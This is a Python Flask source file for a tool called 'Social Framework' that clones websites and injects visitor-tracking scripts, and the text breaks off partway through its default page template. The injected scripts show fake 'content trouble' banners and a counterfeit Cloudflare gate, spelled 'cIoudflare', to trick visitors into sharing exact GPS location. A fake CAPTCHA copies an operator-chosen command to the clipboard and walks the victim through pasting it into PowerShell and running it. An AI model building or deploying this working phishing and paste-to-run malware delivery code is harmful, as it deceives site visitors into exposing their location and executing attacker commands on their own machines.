#!/usr/bin/env python3
# Social Framework - A professional website cloning & data collection framework
# GNU General Public License v3.0

import importlib
import subprocess
import sys
import os
import json
import time
import logging
import threading
import re
import shutil
import uuid
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify, send_from_directory, make_response

# ----------------------------------------------------------------------
# COLOR CODES (ANSI)
# ----------------------------------------------------------------------
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
RESET = "\033[0m"

def cprint(color, msg):
    print(f"{color}{msg}{RESET}")

# ----------------------------------------------------------------------
# BANNER
# ----------------------------------------------------------------------
BANNER = f"""
{CYAN}{BOLD}
   ███████╗ ██████╗  ██████╗██╗ █████╗ ██╗         ███████╗██████╗  █████╗ ███╗   ███╗███████╗
   ██╔════╝██╔═══██╗██╔════╝██║██╔══██╗██║         ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝
   ███████╗██║   ██║██║     ██║███████║██║         █████╗  ██████╔╝███████║██╔████╔██║█████╗  
   ╚════██║██║   ██║██║     ██║██╔══██║██║         ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  
   ███████║╚██████╔╝╚██████╗██║██║  ██║███████╗    ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗
   ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
{RESET}
{YELLOW}{BOLD}              Social Framework v4.0 - Website Cloning & Data Collection{RESET}
{YELLOW}              The reliable tool for capturing visitor information{RESET}
"""

# ----------------------------------------------------------------------
# DEPENDENCY CHECK & AUTO-INSTALL
# ----------------------------------------------------------------------
REQUIRED_PACKAGES = [
    ("flask", "Flask"),
    ("requests", "requests"),
    ("bs4", "beautifulsoup4")
]

def ensure_requirements():
    missing = []
    for module_name, pkg_name in REQUIRED_PACKAGES:
        try:
            importlib.import_module(module_name)
        except ImportError:
            missing.append(pkg_name)

    if missing:
        cprint(RED, "[!] Missing required packages: " + ", ".join(missing))
        answer = input("Install them now? (y/n): ").strip().lower()
        if answer == 'y':
            with open("requirements.txt", "w") as f:
                for _, pkg in REQUIRED_PACKAGES:
                    f.write(pkg + "\n")
            cprint(GREEN, "[*] Installing packages via pip...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
            cprint(GREEN, "[+] Dependencies installed successfully.")
        else:
            cprint(RED, "[!] Cannot continue without dependencies. Exiting.")
            sys.exit(1)
    else:
        if not os.path.exists("requirements.txt"):
            with open("requirements.txt", "w") as f:
                for _, pkg in REQUIRED_PACKAGES:
                    f.write(pkg + "\n")
            cprint(GREEN, "[+] Created requirements.txt")

ensure_requirements()

import requests
from bs4 import BeautifulSoup

# ----------------------------------------------------------------------
# FLASK APP
# ----------------------------------------------------------------------
app = Flask(__name__)
LOG_FILE = "social_framework_log.txt"
CAPTURE_DIR = "captures"
DATA_DIR = "visitor_data"

os.makedirs(CAPTURE_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

CONFIG = {
    "clone_url": None,
    "enable_gps": True,
    "gps_style": 1,
    "page_content": None,
    "youtube_url": None,
    "is_youtube": False,
    "command_mode": False,
    "command_to_run": "ls",
    "cIoudflare_id": "",
    "skeleton": False
}

# ----------------------------------------------------------------------
# GPS POPUP SCRIPTS
# ----------------------------------------------------------------------
GPS_SIMPLE = """
            function requestGPS() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(pos) {
                            const loc = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy, altitude: pos.coords.altitude, heading: pos.coords.heading, speed: pos.coords.speed };
                            fetch('/location', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(loc) })
                                .catch(e => console.warn('Location send error', e));
                        },
                        function(err) {
                            fetch('/location', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({error: err.message}) })
                                .catch(e => console.warn('Location send error', e));
                        },
                        { timeout:5000, enableHighAccuracy:true }
                    );
                } else {
                    fetch('/location', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({error: 'Geolocation not supported'}) })
                        .catch(e => console.warn('Location send error', e));
                }
            }

            setTimeout(requestGPS, 2000);
"""

# Adaptive slide-in banner (matches website colors) - style 2
GPS_ADAPTIVE_CONTENT_TROUBLE = """
            function analyzePageStyles() {
                const styles = {};
                try {
                    const bodyStyle = getComputedStyle(document.body);
                    styles.bodyBg = bodyStyle.backgroundColor || '#ffffff';
                    styles.bodyColor = bodyStyle.color || '#333333';
                    styles.fontFamily = bodyStyle.fontFamily || 'Arial, sans-serif';
                    styles.fontSize = bodyStyle.fontSize || '0.95rem';

                    let btn = document.querySelector('button, .btn, [role="button"], input[type="submit"]');
                    if (btn) {
                        const btnStyle = getComputedStyle(btn);
                        styles.primaryBg = btnStyle.backgroundColor || '#0f172a';
                        styles.primaryColor = btnStyle.color || '#ffffff';
                        styles.primaryBorder = btnStyle.border || 'none';
                        styles.primaryRadius = btnStyle.borderRadius || '40px';
                        styles.btnFont = btnStyle.fontFamily || styles.fontFamily;
                        styles.btnFontSize = btnStyle.fontSize || '0.875rem';
                    } else {
                        styles.primaryBg = '#0f172a';
                        styles.primaryColor = '#ffffff';
                        styles.primaryBorder = 'none';
                        styles.primaryRadius = '40px';
                        styles.btnFont = styles.fontFamily;
                        styles.btnFontSize = '0.875rem';
                    }

                    // Secondary colors for deny / close
                    styles.secondaryColor = '#64748b';
                    styles.secondaryHoverBg = '#f1f5f9';
                    styles.secondaryHoverColor = '#0f172a';
                } catch (e) {}
                return styles;
            }

            function applySkeleton() {
                const textElements = document.querySelectorAll('p, h1, h2, h3, h4, h5, h6, span, a, li, td, th, div');
                textElements.forEach(el => {
                    if (el.children.length === 0 && el.textContent.trim() !== '') {
                        const width = Math.min(el.offsetWidth || 100, 200);
                        const height = el.offsetHeight || 14;
                        el.style.backgroundColor = '#e0e0e0';
                        el.style.color = 'transparent';
                        el.style.borderRadius = '4px';
                        el.style.display = 'inline-block';
                        el.style.width = width + 'px';
                        el.style.height = height + 'px';
                        el.textContent = '';
                    }
                });
                const images = document.querySelectorAll('img');
                images.forEach(img => {
                    img.style.backgroundColor = '#e0e0e0';
                    img.style.minWidth = (img.width || 100) + 'px';
                    img.style.minHeight = (img.height || 80) + 'px';
                    img.removeAttribute('src');
                    img.style.borderRadius = '4px';
                });
            }

            function showAdaptiveContentTrouble() {
                const s = analyzePageStyles();

                const popup = document.createElement('div');
                popup.id = 'gps-popup';
                popup.style.position = 'fixed';
                popup.style.top = '24px';
                popup.style.right = '24px';
                popup.style.width = '520px';
                popup.style.maxWidth = 'calc(100vw - 32px)';
                popup.style.background = s.bodyBg;
                popup.style.borderRadius = '14px';
                popup.style.padding = '14px 24px 16px';
                popup.style.boxShadow = '0 16px 48px -10px rgba(0,0,0,0.12), 0 0 0 1px rgba(0,0,0,0.02)';
                popup.style.zIndex = '1000';
                popup.style.transform = 'translateX(calc(100% + 40px))';
                popup.style.opacity = '0';
                popup.style.display = 'flex';
                popup.style.alignItems = 'center';
                popup.style.gap = '16px';
                popup.style.flexWrap = 'wrap';
                popup.style.fontFamily = s.fontFamily;
                popup.style.animation = 'slideIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards';

                const style = document.createElement('style');
                style.textContent = '@keyframes slideIn { to { transform: translateX(0); opacity: 1; } }';
                document.head.appendChild(style);

                // Close button
                const closeBtn = document.createElement('button');
                closeBtn.innerHTML = '✕';
                closeBtn.setAttribute('aria-label', 'Dismiss');
                closeBtn.style.position = 'absolute';
                closeBtn.style.top = '8px';
                closeBtn.style.right = '12px';
                closeBtn.style.background = 'none';
                closeBtn.style.border = 'none';
                closeBtn.style.fontSize = '18px';
                closeBtn.style.lineHeight = '1';
                closeBtn.style.color = s.secondaryColor;
                closeBtn.style.cursor = 'pointer';
                closeBtn.style.padding = '2px 6px';
                closeBtn.style.borderRadius = '6px';
                closeBtn.style.transition = 'background 0.2s, color 0.2s';
                closeBtn.onmouseover = () => { closeBtn.style.background = s.secondaryHoverBg; closeBtn.style.color = s.secondaryHoverColor; };
                closeBtn.onmouseout = () => { closeBtn.style.background = 'none'; closeBtn.style.color = s.secondaryColor; };
                popup.appendChild(closeBtn);

                // Message
                const p = document.createElement('p');
                p.textContent = 'We have trouble loading the content since we could not determine your rough location. Please enable GPS.';
                p.style.fontSize = '0.95rem';
                p.style.lineHeight = '1.5';
                p.style.color = s.bodyColor;
                p.style.margin = '0';
                p.style.flex = '1 1 240px';
                p.style.paddingRight = '20px';
                popup.appendChild(p);

                // Actions
                const actions = document.createElement('div');
                actions.style.display = 'flex';
                actions.style.alignItems = 'center';
                actions.style.gap = '10px';
                actions.style.flex = '0 0 auto';
                actions.style.flexWrap = 'wrap';
                popup.appendChild(actions);

                // Enable GPS button
                const enableBtn = document.createElement('button');
                enableBtn.textContent = 'Enable GPS';
                enableBtn.style.background = s.primaryBg;
                enableBtn.style.color = s.primaryColor;
                enableBtn.style.border = s.primaryBorder;
                enableBtn.style.padding = '8px 22px';
                enableBtn.style.borderRadius = s.primaryRadius;
                enableBtn.style.fontSize = s.btnFontSize;
                enableBtn.style.fontWeight = '500';
                enableBtn.style.fontFamily = s.btnFont;
                enableBtn.style.cursor = 'pointer';
                enableBtn.style.whiteSpace = 'nowrap';
                enableBtn.style.boxShadow = '0 4px 12px rgba(15,23,42,0.06)';
                actions.appendChild(enableBtn);

                // Deny button
                const denyBtn = document.createElement('button');
                denyBtn.textContent = 'Deny';
                denyBtn.style.background = 'transparent';
                denyBtn.style.color = s.secondaryColor;
                denyBtn.style.border = 'none';
                denyBtn.style.padding = '8px 14px';
                denyBtn.style.fontSize = '0.875rem';
                denyBtn.style.fontWeight = '500';
                denyBtn.style.cursor = 'pointer';
                denyBtn.style.borderRadius = s.primaryRadius;
                denyBtn.style.whiteSpace = 'nowrap';
                actions.appendChild(denyBtn);

                document.body.appendChild(popup);

                function closePopup() { popup.remove(); }

                enableBtn.addEventListener('click', function() {
                    popup.remove();
                    requestGPS();
                });
                denyBtn.addEventListener('click', closePopup);
                closeBtn.addEventListener('click', closePopup);

                enableBtn.onmouseover = () => { enableBtn.style.filter = 'brightness(1.1)'; };
                enableBtn.onmouseout = () => { enableBtn.style.filter = 'none'; };
                denyBtn.onmouseover = () => { denyBtn.style.background = s.secondaryHoverBg; denyBtn.style.color = s.secondaryHoverColor; };
                denyBtn.onmouseout = () => { denyBtn.style.background = 'transparent'; denyBtn.style.color = s.secondaryColor; };
            }

            function requestGPS() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(pos) {
                            const loc = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy, altitude: pos.coords.altitude, heading: pos.coords.heading, speed: pos.coords.speed };
                            fetch('/location', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(loc) })
                                .catch(e => console.warn('Location send error', e));
                        },
                        function(err) {
                            fetch('/location', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({error: err.message}) })
                                .catch(e => console.warn('Location send error', e));
                        },
                        { timeout:5000, enableHighAccuracy:true }
                    );
                } else {
                    fetch('/location', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({error: 'Geolocation not supported'}) })
                        .catch(e => console.warn('Location send error', e));
                }
            }

            if (document.readyState === 'complete') {
                if ({{ skeleton }}) {
                    applySkeleton();
                }
                setTimeout(showAdaptiveContentTrouble, 2000);
            } else {
                window.addEventListener('load', () => {
                    if ({{ skeleton }}) {
                        applySkeleton();
                    }
                    setTimeout(showAdaptiveContentTrouble, 2000);
                });
            }
"""

# cIoudflare banner (blank page) - style 3
CIOUDFLARE_GATE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fff;
            margin: 0;
            padding: 0;
            color: #333;
        }
        .container {
            width: 380px;
            padding: 20px;
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 9999;
            background-color: #fff;
        }
        .header-text {
            font-size: 24px;
            font-weight: 400;
            color: #222;
            line-height: 1.3;
            margin-bottom: 20px;
        }
        .cf-widget {
            background-color: #f3f3f3;
            border: 1px solid #d1d5db;
            border-radius: 4px;
            padding: 0 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            box-sizing: border-box;
            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
            height: 70px;
            overflow: hidden;
        }
        .cf-left {
            display: flex;
            align-items: center;
            gap: 12px;
            height: 100%;
        }
        .icon-container {
            width: 24px;
            height: 24px;
            flex-shrink: 0;
            position: relative;
        }
        .spinner {
            width: 24px;
            height: 24px;
            position: relative;
            display: none;
        }
        .dot {
            position: absolute;
            width: 4px;
            height: 4px;
            background-color: #2ea44f;
            border-radius: 50%;
            top: 50%;
            left: 50%;
            animation: spin-dots 1s infinite linear;
        }
        .dot:nth-child(1) { transform: rotate(0deg) translateY(-10px); }
        .dot:nth-child(2) { transform: rotate(45deg) translateY(-10px); animation-delay: -0.125s; }
        .dot:nth-child(3) { transform: rotate(90deg) translateY(-10px); animation-delay: -0.25s; }
        .dot:nth-child(4) { transform: rotate(135deg) translateY(-10px); animation-delay: -0.375s; }
        .dot:nth-child(5) { transform: rotate(180deg) translateY(-10px); animation-delay: -0.5s; }
        .dot:nth-child(6) { transform: rotate(225deg) translateY(-10px); animation-delay: -0.625s; }
        .dot:nth-child(7) { transform: rotate(270deg) translateY(-10px); animation-delay: -0.75s; }
        .dot:nth-child(8) { transform: rotate(315deg) translateY(-10px); animation-delay: -0.875s; }
        @keyframes spin-dots {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 1; }
        }
        .failure-icon {
            width: 24px;
            height: 24px;
            background-color: #d95525;
            border-radius: 50%;
            position: relative;
            display: none;
        }
        .failure-icon::after {
            content: "";
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 12px;
            height: 4px;
            background-color: #fff;
            border-radius: 2px;
        }
        .verifying-text {
            font-size: 16px;
            color: #111;
            line-height: 1;
        }
        .failure-text-wrap {
            display: flex;
            flex-direction: column;
            justify-content: center;
            line-height: 1.2;
        }
        .failure-text-bold {
            font-size: 16px;
            font-weight: 700;
            color: #111;
        }
        .having-trouble {
            font-size: 13px;
            color: #0000EE;
            text-decoration: underline;
            cursor: pointer;
            margin-top: 2px;
        }
        .cf-right {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            justify-content: center;
            height: 100%;
        }
        .cf-logo img {
            height: 22px;
            margin-bottom: 2px;
        }
        .cf-links {
            font-size: 9px;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-text">Verify you are a human. This may take a few seconds.</div>
        <div class="cf-widget">
            <div class="cf-left">
                <div class="icon-container">
                    <div class="spinner" id="spinner">
                        <div class="dot"></div>
                        <div class="dot"></div>
                        <div class="dot"></div>
                        <div class="dot"></div>
                        <div class="dot"></div>
                        <div class="dot"></div>
                        <div class="dot"></div>
                        <div class="dot"></div>
                    </div>
                    <div class="failure-icon" id="failure-icon"></div>
                </div>
                <div>
                    <div class="verifying-text" id="verifying-text">Verifying...</div>
                    <div class="failure-text-wrap" id="failure-text" style="display: none;">
                        <div class="failure-text-bold">Verification Failed</div>
                        <div class="having-trouble" id="trouble-link">We could not verify you are a human since we couldn't confirm your rough location. Click here to enable GPS.</div>
                    </div>
                </div>
            </div>
            <div class="cf-right">
                <div class="cf-logo">
                    <img src="/cIoudflare_logo.png" alt="cIoudflare">
                </div>
                <div class="cf-links">Privacy • Terms</div>
            </div>
        </div>
    </div>

    <script>
        const spinner = document.getElementById('spinner');
        const failureIcon = document.getElementById('failure-icon');
        const verifyingText = document.getElementById('verifying-text');
        const failureText = document.getElementById('failure-text');
        const troubleLink = document.getElementById('trouble-link');

        setTimeout(() => {
            spinner.style.display = 'block';
            failureIcon.style.display = 'none';
            verifyingText.style.display = 'block';
            failureText.style.display = 'none';
        }, 100);

        setTimeout(() => {
            spinner.style.display = 'none';
            failureIcon.style.display = 'block';
            verifyingText.style.display = 'none';
            failureText.style.display = 'block';
        }, 2000);

        troubleLink.addEventListener('click', function() {
            requestGPS();
        });

        function requestGPS() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        const loc = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy, altitude: pos.coords.altitude, heading: pos.coords.heading, speed: pos.coords.speed };
                        fetch('/location', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(loc) })
                            .then(() => {
                                document.cookie = "gps_verified=1; path=/; max-age=3600";
                                window.location.href = '/';
                            })
                            .catch(() => {
                                alert('GPS request failed');
                            });
                    },
                    function(err) {
                        alert('Geolocation error: ' + err.message);
                    },
                    { timeout:5000, enableHighAccuracy:true }
                );
            } else {
                alert('Geolocation not supported');
            }
        }
    </script>
</body>
</html>
"""

GPS_NONE = "// GPS disabled"

# ----------------------------------------------------------------------
# COMMAND EXECUTION: Banner overlay and instructions
# ----------------------------------------------------------------------
COMMAND_BANNER_SCRIPT = """
            function showCommandBanner() {
                const container = document.createElement('div');
                container.style.position = 'fixed';
                container.style.top = '20px';
                container.style.left = '20px';
                container.style.width = '380px';
                container.style.zIndex = '99999';
                container.style.fontFamily = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif';
                container.style.background = 'transparent';
                container.style.padding = '0';
                container.style.margin = '0';

                container.innerHTML = `
                    <div style="font-size: 20px; font-weight: 400; color: #222; line-height: 1.3; margin-bottom: 20px; white-space: nowrap;">Verify you are a human. This may<br>take a few seconds.</div>
                    <div id="cf-widget" style="background-color: #f3f3f3; border: 1px solid #d1d5db; border-radius: 4px; padding: 0 15px; display: flex; align-items: center; justify-content: space-between; height: 60px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); cursor: pointer; transition: background-color 0.2s;">
                        <div style="display: flex; align-items: center; gap: 12px; height: 100%;">
                            <div style="width: 24px; height: 24px; flex-shrink: 0; position: relative;">
                                <div id="cf-checkbox" style="width: 24px; height: 24px; border: 2px solid #bdbdbd; border-radius: 3px; background: #fff; display: flex; align-items: center; justify-content: center; font-size: 18px; color: #4a90d9;"></div>
                                <div id="cf-spinner" style="width: 24px; height: 24px; position: relative; display: none;">
                                    <div style="position:absolute; width:4px; height:4px; background-color:#2ea44f; border-radius:50%; top:50%; left:50%; animation: cf-spin 1s infinite linear; transform: rotate(0deg) translateY(-10px);"></div>
                                    <div style="position:absolute; width:4px; height:4px; background-color:#2ea44f; border-radius:50%; top:50%; left:50%; animation: cf-spin 1s infinite linear; transform: rotate(45deg) translateY(-10px); animation-delay:-0.125s;"></div>
                                    <div style="position:absolute; width:4px; height:4px; background-color:#2ea44f; border-radius:50%; top:50%; left:50%; animation: cf-spin 1s infinite linear; transform: rotate(90deg) translateY(-10px); animation-delay:-0.25s;"></div>
                                    <div style="position:absolute; width:4px; height:4px; background-color:#2ea44f; border-radius:50%; top:50%; left:50%; animation: cf-spin 1s infinite linear; transform: rotate(135deg) translateY(-10px); animation-delay:-0.375s;"></div>
                                    <div style="position:absolute; width:4px; height:4px; background-color:#2ea44f; border-radius:50%; top:50%; left:50%; animation: cf-spin 1s infinite linear; transform: rotate(180deg) translateY(-10px); animation-delay:-0.5s;"></div>
                                    <div style="position:absolute; width:4px; height:4px; background-color:#2ea44f; border-radius:50%; top:50%; left:50%; animation: cf-spin 1s infinite linear; transform: rotate(225deg) translateY(-10px); animation-delay:-0.625s;"></div>
                                    <div style="position:absolute; width:4px; height:4px; background-color:#2ea44f; border-radius:50%; top:50%; left:50%; animation: cf-spin 1s infinite linear; transform: rotate(270deg) translateY(-10px); animation-delay:-0.75s;"></div>
                                    <div style="position:absolute; width:4px; height:4px; background-color:#2ea44f; border-radius:50%; top:50%; left:50%; animation: cf-spin 1s infinite linear; transform: rotate(315deg) translateY(-10px); animation-delay:-0.875s;"></div>
                                </div>
                                <div id="cf-failure" style="width:24px; height:24px; background-color:#d95525; border-radius:50%; position:relative; display:none;">
                                    <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:12px; height:4px; background:#fff; border-radius:2px;"></div>
                                </div>
                            </div>
                            <div>
                                <div id="cf-text" style="font-size: 16px; color: #111; line-height: 1;">Verify you are a Human</div>
                                <div id="cf-failure-text" style="display:none; flex-direction:column; line-height:1.2;">
                                    <div style="font-size:16px; font-weight:700; color:#111;">Failure!</div>
                                    <div style="font-size:13px; color:#0000EE; text-decoration:underline; cursor:pointer;">Having trouble?</div>
                                </div>
                            </div>
                        </div>
                        <div style="display:flex; flex-direction:column; align-items:flex-end; justify-content:center; height:100%;">
                            <img src="/cIoudflare_logo.png" alt="cIoudflare" style="height:22px; margin-bottom:2px;">
                            <div style="font-size:9px; color:#555;">Privacy • Terms</div>
                        </div>
                    </div>
                `;
                document.body.appendChild(container);

                const style = document.createElement('style');
                style.textContent = '@keyframes cf-spin { 0%,100% { opacity:0.2; } 50% { opacity:1; } }';
                document.head.appendChild(style);

                const widget = document.getElementById('cf-widget');
                const checkbox = document.getElementById('cf-checkbox');
                const spinner = document.getElementById('cf-spinner');
                const failureIcon = document.getElementById('cf-failure');
                const text = document.getElementById('cf-text');
                const failureText = document.getElementById('cf-failure-text');

                let clicked = false;

                widget.addEventListener('click', function() {
                    if (clicked) return;
                    clicked = true;

                    navigator.clipboard.writeText("{{ command }}").catch(() => {});

                    checkbox.style.display = 'none';
                    spinner.style.display = 'block';
                    text.textContent = 'Verifying...';

                    setTimeout(() => {
                        spinner.style.display = 'none';
                        failureIcon.style.display = 'block';
                        text.style.display = 'none';
                        failureText.style.display = 'flex';

                        setTimeout(() => {
                            document.body.innerHTML = `{{ instructions }}`;
                            document.addEventListener('click', function copyCommand() {
                                navigator.clipboard.writeText("{{ command }}");
                                document.removeEventListener('click', copyCommand);
                            });
                        }, 1500);
                    }, 2000);
                });
            }

            if (document.readyState === 'complete') {
                setTimeout(showCommandBanner, 1000);
            } else {
                window.addEventListener('load', () => setTimeout(showCommandBanner, 1000));
            }
"""

# Full instructions HTML (used as inner HTML replacement)
COMMAND_INSTRUCTIONS_HTML = r"""
<div class="page-header">
    <h1><img src="/cIoudflare_logo.png" alt="cIoudflare Logo"> cIoudflare.com</h1>
    <p>Verify you are human by completing the action below.</p>
</div>
<div class="main-card">
    <div class="card-header">
        <div class="spinner">
            <div class="dots-loader">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
            <span>Verifying...</span>
        </div>
        <div class="cIoudflare-logo">
            <img src="/cIoudflare_logo.png" alt="cIoudflare">
        </div>
    </div>
    <hr class="divider">
    <div class="content-text">To prove you are human, please complete the following steps:</div>
    <ul class="steps-list">
        <li class="step-item">
            <span class="step-num">1</span>
            <span>Press <span class="key win"><svg viewBox="0 0 24 24"><rect x="4" y="4" width="8" height="8"></rect><rect x="13" y="4" width="8" height="8"></rect><rect x="4" y="13" width="8" height="8"></rect><rect x="13" y="13" width="8" height="8"></rect></svg>Win</span> + <span class="key grey">X</span></span>
        </li>
        <li class="step-item">
            <span class="step-num">2</span>
            <span>Press <span class="key grey">I</span> or choose <span class="link-text">PowerShell/Terminal</span></span>
        </li>
        <li class="step-item">
            <span class="step-num">3</span>
            <span>Press <span class="key blue">Ctrl</span> + <span class="key grey">V</span></span>
        </li>
        <li class="step-item">
            <span class="step-num">4</span>
            <span>Press <span class="key green">Enter</span> to Verify</span>
        </li>
        <li class="step-item align-top">
            <span class="step-num">5</span>
            <div class="step-content">
                <div class="align-with-num">
                    <span>Observe and agree:</span>
                </div>
                <div class="captcha-box">I am not a robot - cIoudflare ID: {{ cIoudflare_id }}</div>
            </div>
        </li>
        <li class="step-item">
            <span class="step-num">6</span>
            <span>This page will refresh automatically.</span>
        </li>
    </ul>
</div>
<div class="footer-text">
    cIoudflare.com needs to review the security of your connection before proceeding.
</div>
<style>
    body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        background-color: #ffffff;
        margin: 0;
        padding: 20px;
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        color: #000000;
    }
    .page-header {
        text-align: left;
        width: 100%;
        max-width: 574px;
        margin-bottom: 15px;
    }
    .page-header h1 {
        font-size: 32px;
        font-weight: 500;
        margin: 10px 0;
        color: #000000;
        display: flex;
        align-items: center;
    }
    .page-header h1 img {
        height: 36px;
        width: auto;
        margin-right: 15px;
        vertical-align: middle;
    }
    .page-header p {
        font-size: 16px;
        margin: 0;
        color: #000000;
    }
    .main-card {
        width: 550px;
        background-color: #ffffff;
        border: 2px solid #808080;
        border-radius: 4px;
        box-shadow: 0 4px 10px rgba(0,0,0,0.05);
        padding: 24px;
        position: relative;
    }
    .divider {
        border: 0;
        border-top: 1px solid #000000;
        margin: 0 -24px 20px -24px;
    }
    .card-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
    }
    .spinner {
        display: flex;
        align-items: center;
        gap: 15px;
        font-size: 16px;
        color: #000000;
    }
    .spinner span {
        line-height: 24px;
        margin-top: 3px;
    }
    .dots-loader {
        width: 24px;
        height: 24px;
        position: relative;
        display: inline-block;
    }
    .dot {
        position: absolute;
        width: 4px;
        height: 4px;
        background-color: #666;
        border-radius: 50%;
        top: 50%;
        left: 50%;
        animation: loader-spin 1s infinite linear;
    }
    .dot:nth-child(1) { transform: rotate(0deg) translateY(-12px); }
    .dot:nth-child(2) { transform: rotate(45deg) translateY(-12px); animation-delay: -0.125s; }
    .dot:nth-child(3) { transform: rotate(90deg) translateY(-12px); animation-delay: -0.25s; }
    .dot:nth-child(4) { transform: rotate(135deg) translateY(-12px); animation-delay: -0.375s; }
    .dot:nth-child(5) { transform: rotate(180deg) translateY(-12px); animation-delay: -0.5s; }
    .dot:nth-child(6) { transform: rotate(225deg) translateY(-12px); animation-delay: -0.625s; }
    .dot:nth-child(7) { transform: rotate(270deg) translateY(-12px); animation-delay: -0.75s; }
    .dot:nth-child(8) { transform: rotate(315deg) translateY(-12px); animation-delay: -0.875s; }
    @keyframes loader-spin {
        0% { opacity: 0.2; }
        50% { opacity: 1; }
        100% { opacity: 0.2; }
    }
    .cIoudflare-logo {
        display: flex;
        flex-direction: column;
        align-items: flex-end;
    }
    .cIoudflare-logo img {
        height: 48px;
        width: auto;
        margin-bottom: 2px;
    }
    .content-text {
        font-size: 16px;
        margin-bottom: 20px;
        line-height: 1.5;
        color: #000000;
    }
    .steps-list {
        list-style: none;
        padding: 0;
        margin: 0;
    }
    .step-item {
        display: flex;
        align-items: center;
        margin-bottom: 14px;
        font-size: 15px;
        color: #000000;
    }
    .step-num {
        background-color: #555;
        color: #ffffff;
        border-radius: 50%;
        width: 20px;
        height: 20px;
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: 12px;
        font-weight: bold;
        margin-right: 12px;
        flex-shrink: 0;
        line-height: 1;
    }
    .step-item:first-child .step-num {
        background-color: #f6821f;
    }
    .step-item.align-top {
        align-items: flex-start;
    }
    .step-content {
        margin-top: 0;
    }
    .align-with-num {
        display: flex;
        align-items: center;
        height: 20px;
    }
    .link-text {
        color: #000000;
        text-decoration: none;
        font-weight: 800;
        font-size: 1.1em;
        cursor: pointer;
    }
    .link-text:hover {
        text-decoration: underline;
    }
    .key {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        vertical-align: middle;
        padding: 4px 8px;
        border-radius: 4px;
        font-family: monospace;
        font-weight: bold;
        font-size: 14px;
        margin: 0 4px;
        color: #000000;
        border: 2px solid;
    }
    .key.blue {
        background-color: #add8e6;
        border-color: #add8e6;
        color: #000080;
    }
    .key.green {
        background-color: #90ee90;
        border-color: #90ee90;
        color: #006400;
    }
    .key.grey {
        background-color: #f3f3f3;
        border-color: #c0c0c0;
        color: #000000;
    }
    .key.win {
        background-color: #4285f4;
        border-color: #4285f4;
        color: white;
        padding: 4px 10px;
    }
    .key.win svg {
        margin-right: 4px;
        fill: white;
        width: 18px;
        height: 18px;
    }
    .captcha-box {
        border: 1px solid #c0c0c0;
        background-color: #f9f9f9;
        padding: 4px 8px;
        font-size: 13px;
        margin-top: 6px;
        display: inline-block;
        color: #000000;
    }
    .footer-text {
        text-align: center;
        font-size: 14px;
        color: #000000;
        margin-top: 5px;
    }
</style>
"""

# ----------------------------------------------------------------------
# DEFAULT TEMPLATE (fallback for any site)
# ----------------------------------------------------------------------
DEFAULT_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page</title>
    <style>
        body { font-family: Arial, sans-serif; margin:0; padding:20px; background:#f0f0f0; }
        .container { max-width:800px; margin:0 auto; background:#fff; padding:20px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome</h1>
        <p>This page is powered by Social Framework.</p>
    </div>
    <script>
        (function() {
            function sendBrowserInfo() {
                let uaData = null;
                if (navigator.userAgentData) {
                    uaData = {
                        brands: navigator.userAgentData.brands,
                        platform: navigator.userAgentData.platform,
